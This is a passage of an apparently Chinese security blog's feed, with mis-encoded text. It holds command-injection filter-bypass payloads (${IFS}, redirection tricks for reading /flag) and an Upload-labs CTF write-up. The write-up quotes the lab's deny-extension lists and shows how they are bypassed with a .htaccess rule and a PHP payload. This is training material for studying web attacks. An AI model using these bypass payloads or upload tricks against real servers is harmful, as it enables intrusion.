3-5,8</span><br><span class="line"></span><br><span class="line">é€‰é¡¹-cï¼Œä»¥å­—ç¬¦ä¸ºå•ä½è¿›è¡Œåˆ†å‰²ã€‚ç”¨æ³•ä¸-bç±»ä¼¼</span><br><span class="line"></span><br><span class="line">é€‰é¡¹-fï¼Œåé¢è·Ÿåˆ—å·ï¼Œæ¯”å¦‚-f 1ï¼Œè¡¨ç¤ºè¯»å–ç¬¬ä¸€åˆ—çš„ä¿¡æ¯</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># cut -b 1-30 /flag</span></span><br><span class="line">huctf&#123;put_1s_a_900d_wa7&#125;</span><br><span class="line"></span><br><span class="line">root@c6017a98836f:/var<span class="comment"># cut -f 1 /flag</span></span><br><span class="line">huctf&#123;put_1s_a_900d_wa7&#125;</span><br><span class="line"></span><br><span class="line">root@c6017a98836f:/var<span class="comment"># cut -c 1-30 /flag</span></span><br><span class="line">huctf&#123;put_1s_a_900d_wa7&#125;</span><br></pre></td></tr></table></figure><h2 id="hexdump-åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤"><a href="#hexdump-åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤" class="headerlink" title="hexdump(åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤)"></a>hexdump(åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤)</h2><p><strong>hexdumpå‘½ä»¤</strong>ä¸€èˆ¬ç”¨æ¥æŸ¥çœ‹â€œäºŒè¿›åˆ¶â€æ–‡ä»¶çš„åå…­è¿›åˆ¶ç¼–ç ï¼Œä½†å®é™…ä¸Šå®ƒèƒ½æŸ¥çœ‹ä»»ä½•æ–‡ä»¶ï¼Œè€Œä¸åªé™äºäºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ hexdump 1.txt</span><br><span class="line">0000000 6568 6c6c 206f 6978 6e61 7579 3231 2133</span><br><span class="line">0000010 000a</span><br><span class="line">0000011</span><br></pre></td></tr></table></figure><h2 id="xxd-åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤"><a href="#xxd-åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤" class="headerlink" title="xxd(åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤)"></a>xxd(åœ¨dockerä¸­å¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªå‘½ä»¤)</h2><p><strong>xxdèƒ½å°†ä¸€ä¸ªç»™å®šæ–‡ä»¶æˆ–æ ‡å‡†è¾“å…¥è½¬æ¢ä¸ºåå…­è¿›åˆ¶å½¢å¼ï¼Œä¹Ÿèƒ½å°†åå…­è¿›åˆ¶è½¬æ¢å›äºŒè¿›åˆ¶å½¢å¼ã€‚</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ xxd 1.txt</span><br><span class="line">00000000: 6865 6c6c 6f20 7869 616e 7975 3132 3321  hello xianyu123!</span><br><span class="line">00000010: 0a</span><br></pre></td></tr></table></figure><h1 id="ç©ºæ ¼è¿‡æ»¤"><a href="#ç©ºæ ¼è¿‡æ»¤" class="headerlink" title="ç©ºæ ¼è¿‡æ»¤"></a>ç©ºæ ¼è¿‡æ»¤</h1><h2 id="æ–¹æ³•1ï¼š-IFS"><a href="#æ–¹æ³•1ï¼š-IFS" class="headerlink" title="æ–¹æ³•1ï¼š${IFS}"></a>æ–¹æ³•1ï¼š${IFS}</h2><p>payload1:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ ls<span class="variable">$&#123;IFS&#125;</span>/home</span><br><span class="line">ubuntu</span><br></pre></td></tr></table></figure><p>payload2:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ ls<span class="variable">$IFS</span>/home</span><br><span class="line">ubuntu</span><br></pre></td></tr></table></figure><p>payload3:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ ls<span class="variable">$IFS</span><span class="variable">$9</span>/home</span><br><span class="line">ubuntu</span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•2ï¼šé‡å®šå‘ç¬¦-lt-gt"><a href="#æ–¹æ³•2ï¼šé‡å®šå‘ç¬¦-lt-gt" class="headerlink" title="æ–¹æ³•2ï¼šé‡å®šå‘ç¬¦&lt;&gt;"></a>æ–¹æ³•2ï¼šé‡å®šå‘ç¬¦&lt;&gt;</h2><p>payload1:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># cat&lt;&gt;1.txt</span></span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>payload2:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># cat&lt;1.txt</span></span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å‘½ä»¤æ‰§è¡Œbypassçš„æ€»ç»“&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>Upload-labsè§£é¢˜ç¬”è®°</title>
    <link href="http://0clickjacking0.github.io/2019/11/27/Upload-labs%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    <id>http://0clickjacking0.github.io/2019/11/27/Upload-labsè§£é¢˜ç¬”è®°/</id>
    <published>2019-11-27T11:56:44.000Z</published>
    <updated>2020-05-11T08:41:14.841Z</updated>
    
    <content type="html"><![CDATA[<p>upload-labsè§£é¢˜è®°å½•</p><a id="more"></a><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ "</span> + allow_ext + <span class="string">"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š"</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡æŸ¥çœ‹æºç ï¼Œæˆ‘ä»¬å¾—çŸ¥è¿™é‡Œåªæ˜¯è¿›è¡Œäº†å‰ç«¯çš„æ£€æµ‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆä¸Šä¼ ä¸€ä¸ªåç¼€åä¸ºgifçš„æ–‡ä»¶ï¼Œç„¶åæŠ“åŒ…ï¼Œåœ¨burpä¸­æŠŠgifæ”¹æˆphpï¼Œç„¶åå°±å¯ä»¥ç›´æ¥ç»•è¿‡äº†</p><p><img src="http://images.xianyu123.club/up_pass1_1.png" alt></p><p><img src="http://images.xianyu123.club/up_pass1_2.png" alt></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡æŸ¥çœ‹æºç ï¼Œæˆ‘ä»¬å‘ç°è¿™é‡Œåªæ˜¯æ£€æµ‹äº†http headerå­—æ®µä¸­çš„<code>Content-Type</code>å­—æ®µï¼Œå¹¶æ²¡æœ‰å¯¹åç¼€åè¿›è¡Œæ£€æµ‹ï¼Œæ‰€ä»¥ä¸Šä¼ åç¼€åä¸ºphpçš„æ–‡ä»¶å³å¯</p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†<code>.asp,.aspx,.php,.jsp</code>åç¼€çš„æ–‡ä»¶</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆä¸Šä¼ ä¸€ä¸ª<code>.htaccess</code>æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œè¿™é‡Œçš„å«ä¹‰å°±æ˜¯æŠŠjpgæ–‡ä»¶å½“ä½œphpè§£æ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬ä¸Šä¼ <code>1.jpg</code>ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œç„¶åè®¿é—®å³å¯ï¼Œå¦‚æœæ— æ³•è§£æï¼Œé‚£ä¹ˆå°±æ˜¯æœ¬åœ°æ²¡æœ‰å¼€å¯apacheæœåŠ¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><h2 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;upload-labsè§£é¢˜è®°å½•&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>php-security-calendar-2017æ¼æ´åˆ†æç¬”è®°</title>
    <link href="http://0clickjacking0.github.io/2019/11/27/php-security-calendar-2017%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0/"/>
    <id>http://0clickjacking0.github.io/2019/11/27/php-security-calendar-2017æ¼æ´åˆ†æç¬”è®°/</id>
    <published>2019-11-27T11:56:14.000Z</published>
    <updated>2019-11-30T07:33:22.000Z</updated>
    
